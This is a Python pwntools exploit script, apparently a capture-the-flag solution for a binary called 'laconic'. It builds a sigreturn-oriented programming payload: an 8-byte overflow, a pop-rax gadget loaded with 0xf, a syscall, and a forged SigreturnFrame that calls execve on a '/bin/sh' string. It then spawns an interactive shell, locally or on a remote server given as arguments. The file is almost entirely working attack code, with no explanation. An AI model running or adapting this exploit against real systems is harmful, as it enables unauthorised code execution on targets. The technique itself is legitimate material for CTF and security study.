from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
b*_start+23
continue
'''.format(**locals())


exe = './laconic' #change this
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

pop_rax = 0x0000000000043018
syscall = 0x0000000000043015
binsh = 0x43238


frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = binsh
frame.rsi = 0x0
frame.rdx = 0x0
frame.rsp = 0x43240
frame.rip = syscall

payload = flat(
    b'A' * 8,
    pop_rax,
    0xf,
    syscall,
    bytes(frame)
    )

io.send(payload)
io.interactive()